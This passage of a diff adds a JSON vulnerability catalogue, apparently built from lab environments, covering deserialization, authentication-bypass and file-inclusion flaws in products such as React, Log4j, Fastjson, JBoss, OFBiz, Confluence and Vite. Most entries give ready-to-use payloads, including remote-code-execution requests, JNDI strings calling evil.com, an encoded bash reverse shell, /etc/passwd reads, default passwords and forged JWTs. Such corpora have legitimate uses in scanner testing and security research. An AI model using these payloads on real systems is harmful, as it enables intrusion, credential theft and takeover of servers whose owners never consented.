+        "AES encryption with default key kPH+bIxk5D2deZiIxcaaaA=="
+      ]
+    },
+    {
+      "app": "react",
+      "target": "CVE-2025-55182",
+      "description": "A deserialization vulnerability in React Server Components allows unauthenticated remote code execution by sending a malicious HTTP request to a Server Function endpoint, exploiting prototype pollution during payload decoding.",
+      "payloads": [
+        "POST / HTTP/1.1 with Next-Action: x header and multipart/form-data body containing JSON with fields like \"then\": \"$1:__proto__:then\", \"_response\": {\"_prefix\": \"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});\", \"_chunks\": \"$Q2\", \"_formData\": {\"get\": \"$1:constructor:constructor\"}}"
+      ]
+    },
+    {
+      "app": "python",
+      "target": "unpickle",
+      "description": "The vulnerability occurs when the application deserializes untrusted user-controlled data via Python's pickle module without validation, allowing attackers to execute arbitrary code by crafting malicious serialized objects.",
+      "payloads": [
+        "base64 encoded malicious pickle object in 'user' cookie",
+        "exp.py script using __reduce__ method to execute reverse shell command"
+      ]
+    },
+    {
+      "app": "phpmyadmin",
+      "target": "WooYun-2016-199433",
+      "description": "A deserialization vulnerability in phpMyAdmin 2.x allows attackers to read arbitrary files or execute arbitrary code via the scripts/setup.php endpoint.",
+      "payloads": [
+        "POST /scripts/setup.php HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 80\n\naction=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2020-9496",
+      "description": "Apache OFBiz XMLRPC接口存在反序列化漏洞，攻击者可发送恶意XML请求执行任意命令。",
+      "payloads": [
+        "POST /webtools/control/xmlrpc HTTP/1.1",
+        "Content-Type: application/xml",
+        "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">[base64-payload]</serializable></value></member></struct></value></param></params></methodCall>"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2023-49070",
+      "description": "Apache OFBiz XMLRPC接口存在反序列化漏洞，攻击者可通过构造特定XML请求绕过补丁限制，在目标服务器上执行任意命令。",
+      "payloads": [
+        "/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y",
+        "<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>ProjectDiscovery</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>test</name>\n            <value>\n              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">[base64-payload]</serializable>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>"
+      ]
+    },
+    {
+      "app": "neo4j",
+      "target": "CVE-2021-34371",
+      "description": "Neo4j Shell Server allows unauthenticated RMI calls to the setSessionVariable method, which triggers a deserialization vulnerability via a Rhino-based gadget chain, enabling remote code execution.",
+      "payloads": [
+        "RMI protocol calls to setSessionVariable method",
+        "Rhino-based gadget chain payload"
+      ]
+    },
+    {
+      "app": "log4j",
+      "target": "CVE-2017-5645",
+      "description": "Apache Log4j TCP Server versions before 2.8.2 have a deserialization vulnerability that allows attackers to execute arbitrary code by sending malicious payloads to the server on port 4712.",
+      "payloads": [
+        "java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 \"touch /tmp/success\" | nc your-ip 4712",
+        "payloads for reverse shell from runtime-exec-payloads.html"
+      ]
+    },
+    {
+      "app": "log4j",
+      "target": "CVE-2021-44228",
+      "description": "Apache Log4j2 versions 2.0 to 2.14.1 are vulnerable to JNDI injection via crafted lookup strings in log messages, allowing remote code execution when attackers control log input.",
+      "payloads": [
+        "${jndi:ldap://evil.com/example}",
+        "${jndi:dns://${sys:java.version}.example.com}",
+        "/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com}"
+      ]
+    },
+    {
+      "app": "liferay-portal",
+      "target": "CVE-2020-7961",
+      "description": "Liferay Portal CE 7.2.0 GA1 and earlier have a deserialization vulnerability in the API interface, allowing attackers to execute arbitrary commands via crafted requests.",
+      "payloads": [
+        "+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c...\"}"
+      ]
+    },
+    {
+      "app": "laravel",
+      "target": "CVE-2021-3129",
+      "description": "Laravel Ignition before 2.5.2 allows remote code execution via deserialization through the misuse of file_get_contents() and file_put_contents() with the phar:// protocol.",
+      "payloads": [
+        "POST /_ignition/execute-solution HTTP/1.1",
+        "{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"username\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}",
+        "phar:// protocol",
+        "phpggc Laravel/RCE5 \"phpinfo();\" --phar phar"
+      ]
+    },
+    {
+      "app": "kafka",
+      "target": "CVE-2023-25194",
+      "description": "JNDI injection vulnerability in Apache Kafka clients via the sasl.jaas.config property, allowing remote code execution when controlled by an attacker.",
+      "payloads": [
+        "POST /druid/indexer/v1/sampler?for=connect HTTP/1.1",
+        "{\"type\":\"kafka\",\"spec\":{\"type\":\"kafka\",\"ioConfig\":{\"type\":\"kafka\",\"consumerProperties\":{\"bootstrap.servers\":\"127.0.0.1:6666\",\"sasl.mechanism\":\"SCRAM-SHA-256\",\"security.protocol\":\"SASL_SSL\",\"sasl.jaas.config\":\"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\\"ldap://java-chains"
+      ]
+    },
+    {
+      "app": "jmeter",
+      "target": "CVE-2018-1297",
+      "description": "Apache JMeter 2.x and 3.x versions have a deserialization vulnerability in the RMI service, allowing attackers to execute arbitrary commands on the target server via crafted serialized objects.",
+      "payloads": [
+        "ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 'touch /tmp/success'",
+        "BeanShell1"
+      ]
+    },
+    {
+      "app": "jenkins",
+      "target": "CVE-2017-1000353",
+      "description": "Unauthenticated remote code execution via deserialization of a malicious Java SignedObject sent to Jenkins CLI, bypassing blacklist protections.",
+      "payloads": [
+        "jenkins_poc.ser (serialized Java SignedObject)",
+        "exploit.py script for sending payload"
+      ]
+    },
+    {
+      "app": "jboss",
+      "target": "CVE-2017-12149",
+      "description": "JBoss AS 5.x/6.x HttpInvoker component's ReadOnlyAccessFilter deserializes untrusted POST data without validation, allowing remote code execution via crafted Java serialized objects.",
+      "payloads": [
+        "POST /invoker/readonly with serialized data (e.g., from ysoserial CommonsCollections5 gadget)",
+        "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}"
+      ]
+    },
+    {
+      "app": "jboss",
+      "target": "CVE-2017-7504",
+      "description": "JBoss AS 4.x and earlier versions have a deserialization vulnerability in the JMS over HTTP Invocation Layer, allowing remote attackers to execute arbitrary code via crafted serialized data sent to the /jbossmq-httpil/HTTPServerILServlet endpoint.",
+      "payloads": [
+        "/jbossmq-httpil/HTTPServerILServlet",
+        "POST request with serialized payload from ysoserial CommonsCollections5 exploit chain"
+      ]
+    },
+    {
+      "app": "jboss",
+      "target": "JMXInvokerServlet-deserialization",
+      "description": "JBoss JMXInvokerServlet deserializes user-supplied objects in POST requests to /invoker/JMXInvokerServlet, allowing remote code execution via Apache Commons Collections gadget chains.",
+      "payloads": [
+        "/invoker/JMXInvokerServlet",
+        "ysoserial-generated POC in POST body",
+        "DeserializeExploit.jar tool for command execution and file upload"
+      ]
+    },
+    {
+      "app": "java",
+      "target": "rmi-registry-bind-deserialization",
+      "description": "Java RMI Registry allows remote binding with malicious serialized data, triggering deserialization of objects that implement Remote interface or dynamic proxies, leading to remote code execution via exploitation chains like CommonsCollections.",
+      "payloads": [
+        "ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 \"curl your-dnslog-server\""
+      ]
+    },
+    {
+      "app": "java",
+      "target": "rmi-registry-bind-deserialization-bypass",
+      "description": "The vulnerability involves bypassing RMI Registry's deserialization whitelist by using forged serialized data, such as Remote interface implementations or dynamic proxies, to trigger exploitation chains during binding, leading to remote code execution.",
+      "payloads": [
+        "Remote interface implementations",
+        "dynamic proxy objects",
+        "ysoserial RMIRegistryExploit2",
+        "ysoserial RMIRegistryExploit3",
+        "JRMPListener with CommonsCollections6 gadget"
+      ]
+    },
+    {
+      "app": "jackson",
+      "target": "CVE-2017-7525",
+      "description": "Jackson-databind allows polymorphic deserialization, enabling attackers to specify arbitrary classes in JSON, leading to remote code execution via gadgets like TemplatesImpl.",
+      "payloads": [
+        "POST /exploit HTTP/1.1",
+        "Content-Type: application/json",
+        "JSON specifying TemplatesImpl class with transletBytecodes for command execution"
+      ]
+    },
+    {
+      "app": "hertzbeat",
+      "target": "CVE-2024-42323",
+      "description": "Apache HertzBeat versions before 1.6.0 use a vulnerable SnakeYAML library to parse YAML files, allowing authenticated users to trigger remote code execution via untrusted data deserialization when importing monitor types through specific API endpoints.",
+      "payloads": [
+        "!!org.h2.jdbc.JdbcConnection [ \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\\"touch /tmp/success\\\")\\\\; }$$\\\\;CALL EXEC ()\\\\;\", [], \"a\", \"b\", false ]"
+      ]
+    },
+    {
+      "app": "fastjson",
+      "target": "1.2.24-rce",
+      "description": "Fastjson 1.2.24 is vulnerable to remote code execution via deserialization of malicious JSON payloads using autoType feature, exploiting JNDI injection with com.sun.rowset.JdbcRowSetImpl.",
+      "payloads": [
+        "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}"
+      ]
+    },
+    {
+      "app": "dubbo",
+      "target": "CVE-2019-17564",
+      "description": "Apache Dubbo uses Spring's HttpInvokerServiceExporter for HTTP communication, which deserializes untrusted POST request bodies, leading to remote code execution via Java deserialization.",
+      "payloads": [
+        "POST request body with ysoserial-generated payload (e.g., CommonsCollections6) to endpoint like /org.vulhub.api.CalcService"
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2017-6920",
+      "description": "Drupal 8.x to 8.3.4 has a remote code execution vulnerability due to unsafe deserialization of YAML content via the PECL YAML parser, allowing attackers to execute arbitrary PHP code.",
+      "payloads": [
+        "!php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\""
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2019-6339",
+      "description": "The vulnerability is due to improper handling of PHAR deserialization in the file system service, allowing remote code execution via a crafted image file.",
+      "payloads": [
+        "phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg"
+      ]
+    },
+    {
+      "app": "coldfusion",
+      "target": "CVE-2017-3066",
+      "description": "Adobe ColdFusion has a Java deserialization vulnerability in the AMF endpoint, allowing remote code execution via crafted serialized objects.",
+      "payloads": [
+        "POST /flex2gateway/amf HTTP/1.1 with Content-Type: application/x-amf and body containing generated POC from ColdFusionPwn tool"
+      ]
+    },
+    {
+      "app": "coldfusion",
+      "target": "CVE-2023-29300",
+      "description": "Adobe ColdFusion XML deserialization vulnerability allows attackers to call arbitrary Java setter methods, leading to remote code execution via JNDI injection.",
+      "payloads": [
+        "POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1",
+        "argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://your.ldap.server/example</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>"
+      ]
+    },
+    {
+      "app": "celery",
+      "target": "celery3_redis_unauth",
+      "description": "Celery <4.0 uses Pickle for task message serialization, and when the queue service (e.g., Redis) has unauthorized access, it allows arbitrary code execution via Pickle deserialization.",
+      "payloads": [
+        "exploit.py"
+      ]
+    },
+    {
+      "app": "apereo-cas",
+      "target": "4.1-rce",
+      "description": "Apereo CAS 4.1 uses a default encryption key 'changeit' in Webflow, allowing attackers to craft malicious payloads that trigger deserialization and execute arbitrary commands.",
+      "payloads": [
+        "POST /cas/login HTTP/1.1 with execution parameter replaced by encrypted payload from Apereo-CAS-Attack tool using CommonsCollections4, e.g., 'touch /tmp/success'"
+      ]
+    },
+    {
+      "app": "activemq",
+      "target": "CVE-2015-5254",
+      "description": "Apache ActiveMQ 5.x before 5.13.0 does not restrict classes that can be serialized in the broker, allowing remote attackers to execute arbitrary code via a crafted serialized Java Message Service (JMS) ObjectMessage object.",
+      "payloads": [
+        "jmet-0.1.0-all.jar with -Y \"touch /tmp/success\" -Yp ROME",
+        "ysoserial gadget ROME",
+        "JMSDestination=event in admin/browse.jsp"
+      ]
+    },
+    {
+      "app": "activemq",
+      "target": "CVE-2023-46604",
+      "description": "Apache ActiveMQ OpenWire protocol deserialization vulnerability allows remote attackers to instantiate arbitrary classes via manipulated serialized class types, leading to remote code execution.",
+      "payloads": [
+        "poc.xml",
+        "poc.py"
+      ]
+    }
+  ],
+  "auth-bypass": [
+    {
+      "app": "weblogic",
+      "target": "weak_password",
+      "description": "WebLogic management console has weak default credentials (weblogic/Oracle@123) allowing unauthorized access, and an arbitrary file read vulnerability via path parameter in file.jsp.",
+      "payloads": [
+        "weblogic/Oracle@123",
+        "/hello/file.jsp?path=/etc/passwd",
+        "/hello/file.jsp?path=./security/SerializedSystemIni.dat",
+        "/hello/file.jsp?path=./config/config.xml"
+      ]
+    },
+    {
+      "app": "v2board",
+      "target": "1.6-privilege-escalation",
+      "description": "The vulnerability allows a regular user to access admin APIs by exploiting a session caching flaw where the server fails to verify user roles when reading cached authentication data from Redis.",
+      "payloads": [
+        "Authorization: ZXhhbXBsZUBleGFtcGxlLmNvbTokMnkkMTAkMVJpUFplR2RnZlFPSVRyWEM4dW0udW5QZVZNTGs3RlFFbkFVVnBwbEhmTlMyczdQaEpTa3E=",
+        "/api/v1/admin/user/fetch"
+      ]
+    },
+    {
+      "app": "tomcat",
+      "target": "tomcat8",
+      "description": "Tomcat 8 has a default weak password 'tomcat:tomcat' for the manager role, allowing unauthorized access to the backend for deploying war files and gaining remote code execution.",
+      "payloads": [
+        "tomcat:tomcat",
+        "/manager/html",
+        "war file upload"
+      ]
+    },
+    {
+      "app": "tikiwiki",
+      "target": "CVE-2020-15906",
+      "description": "A logic flaw in Tiki Wiki CMS Groupware allows authentication bypass by logging in with a blank password after the admin account is locked due to over 60 failed login attempts.",
+      "payloads": [
+        "blank password",
+        "admin account login after lockout"
+      ]
+    },
+    {
+      "app": "superset",
+      "target": "CVE-2023-27524",
+      "description": "Apache Superset uses hardcoded default JWT secret keys to sign session cookies, allowing attackers to forge valid cookies and authenticate as any user, including administrators, when the default key is not changed.",
+      "payloads": [
+        "session=eyJ...",
+        "SECRET_KEY values: \\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h, CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET, thisISaSECRET_1234, YOUR_OWN_RANDOM_GENERATED_SECRET_KEY, TEST_NON_DEV_SECRET"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2022-22978",
+      "description": "Spring Security RegexRequestMatcher with '.' in regex allows authentication bypass via crafted URLs with newline characters.",
+      "payloads": [
+        "/admin/%0atest",
+        "/admin/%0dtest"
+      ]
+    },
+    {
+      "app": "shiro",
+      "target": "CVE-2010-3863",
+      "description": "Apache Shiro versions before 1.1.0 do not normalize URLs before authentication, allowing attackers to bypass access controls using crafted paths like /./admin.",
+      "payloads": [
+        "/./admin",
+        "/",
+        "//",
+        "/../"
+      ]
+    },
+    {
+      "app": "shiro",
+      "target": "CVE-2020-1957",
+      "description": "Attackers can bypass Shiro's directory permission restrictions by constructing a path traversal payload with '..;' when using Spring dynamic controllers.",
+      "payloads": [
+        "/xxx/..;/admin/"
+      ]
+    },
+    {
+      "app": "scrapy",
+      "target": "scrapyd-unacc",
+      "description": "scrapyd service is exposed without authentication on port 6800, allowing attackers to deploy malicious scrapy packages and execute arbitrary code on the server.",
+      "payloads": [
+        "http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg"
+      ]
+    },
+    {
+      "app": "saltstack",
+      "target": "CVE-2020-11651",
+      "description": "Attackers can bypass Salt Master authentication by sending a crafted request to call unauthorized functions, leading to remote command execution.",
+      "payloads": [
+        "{'cmd': '_prep_auth_info'}"
+      ]
+    },
+    {
+      "app": "rsync",
+      "target": "common",
+      "description": "Rsync service is exposed without authentication or ACLs, allowing unauthorized access to read and write files on the server.",
+      "payloads": [
+        "rsync://your-ip:873/",
+        "rsync://your-ip:873/src/",
+        "rsync -av rsync://your-ip:873/src/etc/passwd ./",
+        "rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell"
+      ]
+    },
+    {
+      "app": "openssh",
+      "target": "CVE-2018-15473",
+      "description": "OpenSSH 7.7 before version 7.7p1 allows attackers to enumerate valid usernames by exploiting differences in server responses during authentication attempts.",
+      "payloads": [
+        "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022",
+        "python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip"
+      ]
+    },
+    {
+      "app": "openfire",
+      "target": "CVE-2023-32315",
+      "description": "A directory traversal vulnerability in Openfire's web management console allows attackers to bypass authentication by using UTF-16 encoded characters in URLs to access restricted pages.",
+      "payloads": [
+        "/setup/setup-/%u002e%u002e/%u002e%u002e/[page].jsp",
+        "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2023-51467",
+      "description": "The vulnerability is an authentication bypass in Apache OFBiz due to incomplete patching of CVE-2023-49070, allowing unauthorized access to execute Groovy expressions leading to remote code execution.",
+      "payloads": [
+        "POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1",
+        "groovyProgram=throw+new+Exception('id'.execute().text);"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2024-45195",
+      "description": "Authentication bypass in Apache OFBiz due to incomplete fixes for previous vulnerabilities, allowing unauthorized access to admin-only view maps and leading to remote code execution.",
+      "payloads": [
+        "POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1",
+        "rceschema.xml",
+        "rcereport.csv"
+      ]
+    },
+    {
+      "app": "ntopng",
+      "target": "CVE-2021-28073",
+      "description": "The vulnerability allows unauthorized access to any ntopng interface by exploiting a path traversal or parameter manipulation in the URL, bypassing authentication requirements.",
+      "payloads": [
+        "/lua/find_prefs.lua",
+        "poc.py with baselength calculation and URL generation for path traversal"
+      ]
+    },
+    {
+      "app": "next.js",
+      "target": "CVE-2025-29927",
+      "description": "Next.js versions before 14.2.25 and 15.2.3 have an authorization bypass vulnerability where attackers can manipulate the x-middleware-subrequest header to circumvent middleware-based security controls, allowing unauthorized access to protected resources.",
+      "payloads": [
+        "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware",
+        "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+      ]
+    },
+    {
+      "app": "nacos",
+      "target": "CVE-2021-29441",
+      "description": "The vulnerability allows bypassing authentication in Nacos by setting the User-Agent header to 'Nacos-Server', enabling unauthorized access to sensitive information and user management.",
+      "payloads": [
+        "User-Agent: Nacos-Server",
+        "GET /nacos/v1/auth/users?pageNo=1&pageSize=9",
+        "POST /nacos/v1/auth/users?username=vulhub&password=vulhub"
+      ]
+    },
+    {
+      "app": "mysql",
+      "target": "CVE-2012-2122",
+      "description": "A vulnerability in MariaDB/MySQL authentication allows login with incorrect passwords due to improper handling of memcmp() return values, enabling brute-force access by repeatedly attempting connections.",
+      "payloads": [
+        "mysql -uroot -pwrong -h your-ip -P3306"
+      ]
+    },
+    {
+      "app": "libssh",
+      "target": "CVE-2018-10933",
+      "description": "The vulnerability allows an attacker to bypass authentication by sending a MSG_USERAUTH_SUCCESS message before completing the authentication process, granting unauthorized access to the SSH server.",
+      "payloads": [
+        "MSG_USERAUTH_SUCCESS"
+      ]
+    },
+    {
+      "app": "jupyter",
+      "target": "notebook-rce",
+      "description": "Jupyter Notebook lacks password protection, allowing unauthorized access to create terminals and execute arbitrary Python code or commands.",
+      "payloads": [
+        "http://your-ip:8888",
+        "new -> terminal"
+      ]
+    },
+    {
+      "app": "jumpserver",
+      "target": "CVE-2023-42820",
+      "description": "The vulnerability involves leaking the random seed from django-simple-captcha, allowing attackers to predict password reset tokens and hijack user accounts.",
+      "payloads": [
+        "/core/auth/password/forget/previewing/",
+        "/core/auth/captcha/image/[seed]/",
+        "/core/auth/password/forgot/?token=[token]",
+        "python poc.py -t http://target --email user@example.com --seed [seed] --token [token]"
+      ]
+    },
+    {
+      "app": "joomla",
+      "target": "CVE-2023-23752",
+      "description": "An attribute override vulnerability in Joomla versions 4.0.0 to 4.2.7 allows attackers to bypass permission checks by adding the parameter public=true to REST API requests, enabling unauthorized access to sensitive data.",
+      "payloads": [
+        "public=true",
+        "/api/index.php/v1/config/application?public=true",
+        "/api/index.php/v1/users?public=true"
+      ]
+    },
+    {
+      "app": "influxdb",
+      "target": "CVE-2019-20933",
+      "description": "InfluxDB versions before 1.7.6 have a default empty JWT shared secret, allowing attackers to forge JWT tokens and bypass authentication to execute arbitrary SQL queries.",
+      "payloads": [
+        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s",
+        "POST /query HTTP/1.1 with db=sample&q=show+users"
+      ]
+    },
+    {
+      "app": "inetutils",
+      "target": "CVE-2026-24061",
+      "description": "The vulnerability is a parameter injection in GNU InetUtils telnetd where an attacker can bypass authentication by injecting the '-f' parameter into the USER environment variable, allowing root access without credentials.",
+      "payloads": [
+        "USER=\"-f root\" telnet -a 127.0.0.1 2323",
+        "USER=\"-f root\" telnet 127.0.0.1 2323"
+      ]
+    },
+    {
+      "app": "hugegraph",
+      "target": "CVE-2024-43441",
+      "description": "Apache HugeGraph uses a hardcoded default JWT secret key when authentication is enabled but not configured, allowing attackers to generate valid tokens to bypass authentication.",
+      "payloads": [
+        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg",
+        "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg"
+      ]
+    },
+    {
+      "app": "hadoop",
+      "target": "unauthorized-yarn",
+      "description": "Hadoop YARN ResourceManager lacks access controls, allowing unauthorized users to submit and execute arbitrary applications via REST APIs without authentication.",
+      "payloads": [
+        "http://your-ip:8088",
+        "New Application API",
+        "Submit Application API"
+      ]
+    },
+    {
+      "app": "gogs",
+      "target": "CVE-2018-18925",
+      "description": "Gogs versions 0.11.66 and earlier do not validate session IDs, allowing attackers to read arbitrary files and manipulate session content to log in as any user.",
+      "payloads": [
+        "../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10",
+        "i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10"
+      ]
+    },
+    {
+      "app": "couchdb",
+      "target": "CVE-2017-12635",
+      "description": "A vertical privilege escalation vulnerability in Apache CouchDB due to differences in JSON parsing between Erlang and JavaScript, allowing unauthorized users to create admin accounts by exploiting duplicate keys in JSON payloads.",
+      "payloads": [
+        "PUT /_users/org.couchdb.user:vulhub HTTP/1.1 with JSON body containing duplicate \"roles\" keys: {\"type\": \"user\", \"name\": \"vulhub\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"vulhub\"}"
+      ]
+    },
+    {
+      "app": "confluence",
+      "target": "CVE-2023-22515",
+      "description": "An attribute overwrite vulnerability in Atlassian Confluence allows attackers to reset the setup process and create a new administrator account.",
+      "payloads": [
+        "GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
+        "POST /setup/setupadministrator.action with username=vulhub&fullName=vulhub&email=admin%40vulhub.org&password=vulhub&confirm=vulhub&setup-next-button=Next",
+        "POST /setup/finishsetup.action"
+      ]
+    },
+    {
+      "app": "appweb",
+      "target": "CVE-2018-8715",
+      "description": "In AppWeb versions before 7.0.3, a logic error in digest and form authentication allows bypassing authentication by sending a request with a null password (i.e., omitting the password parameter), leading to unauthorized access.",
+      "payloads": [
+        "Authorization: Digest username=admin"
+      ]
+    },
+    {
+      "app": "apisix",
+      "target": "CVE-2021-45232",
+      "description": "Unauthorized access to two APIs in Apache APISIX Dashboard allows exporting and importing configurations, leading to remote code execution via malicious Lua scripts.",
+      "payloads": [
+        "/apisix/admin/migrate/export",
+        "/apisix/admin/migrate/import",
+        "GET /okw1Rh HTTP/1.1 with CMD header"
+      ]
+    },
+    {
+      "app": "aj-report",
+      "target": "CNVD-2024-15077",
+      "description": "AJ-Report 1.4.0 has an authentication bypass vulnerability that allows attackers to circumvent permission checks and execute arbitrary code via a crafted POST request.",
+      "payloads": [
+        "POST /dataSetParam/verification;swagger-ui/ HTTP/1.1",
+        "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\":\"function verification(data){a = new java.lang.ProcessBuilder(\\\"id\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
+      ]
+    },
+    {
+      "app": "airflow",
+      "target": "CVE-2020-17526",
+      "description": "Apache Airflow versions up to 1.10.13 have a default secret key 'temporary_key' that allows attackers to forge session cookies and bypass authentication, impersonating any user.",
+      "payloads": [
+        "temporary_key",
+        "{'user_id': '1', '_fresh': False, '_permanent': True}"
+      ]
+    }
+  ],
+  "lfi": [
+    {
+      "app": "vite",
+      "target": "CNVD-2022-44615",
+      "description": "Vite development server allows arbitrary file reading via the @fs prefix in versions before 2.3.0, enabling access to sensitive files like /etc/passwd.",
+      "payloads": [
+        "@fs/etc/passwd"
+      ]
+    },
+    {
+      "app": "vite",
+      "target": "CVE-2025-30208",
+      "description": "Vite development server's file access restriction can be bypassed by appending ?raw?? or ?import&raw?? to URLs with the @fs prefix, allowing arbitrary file reads.",
+      "payloads": [
+        "/@fs/etc/passwd?raw??",
+        "/@fs/etc/passwd?import&raw??"
+      ]
+    },
+    {
+      "app": "uwsgi",
+      "target": "CVE-2018-7490",
+      "description": "uWSGI PHP plugin before version 2.0.17 mishandles DOCUMENT_ROOT validation, allowing directory traversal via URL-encoded sequences like ..%2f to access files outside the intended directory.",
+      "payloads": [
+        "http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd"
+      ]
+    },
+    {
+      "app": "tomcat",
+      "target": "CVE-2020-1938",
+      "description": "A vulnerability in Apache Tomcat's AJP protocol allows attackers to read or include arbitrary files within webapp directories via the AJP connector, potentially leading to remote code execution if file upload is available.",
+      "payloads": [
+        "AJP protocol requests to port 8009",
+        "file paths within webapp directories"
+      ]
+    },
+    {
+      "app": "thinkphp",
+      "target": "lang-rce",
+      "description": "ThinkPHP 6.0.13 and earlier versions have a local file inclusion vulnerability via the 'lang' parameter when multi-language features are enabled, allowing attackers to include arbitrary PHP files.",
+      "payloads": [
+        "/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php",
+        "lang=../../../../../../../../../../../usr/local/lib/php/pearcmd",
+        "lang=public/index.php"
+      ]
+    },
+    {
+      "app": "saltstack",
+      "target": "CVE-2020-11652",
+      "description": "Directory traversal vulnerability in SaltStack's wheel module allows attackers to read or write arbitrary files on the server by using path traversal sequences like '../' in requests.",
+      "payloads": [
+        "{'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'path': '../../path/to/target', 'data': 'test'}"
+      ]
+    },
+    {
+      "app": "rails",
+      "target": "CVE-2018-3760",
+      "description": "Path traversal vulnerability in Sprockets due to double URL encoding, allowing attackers to bypass directory restrictions and read arbitrary files via crafted URLs.",
+      "payloads": [
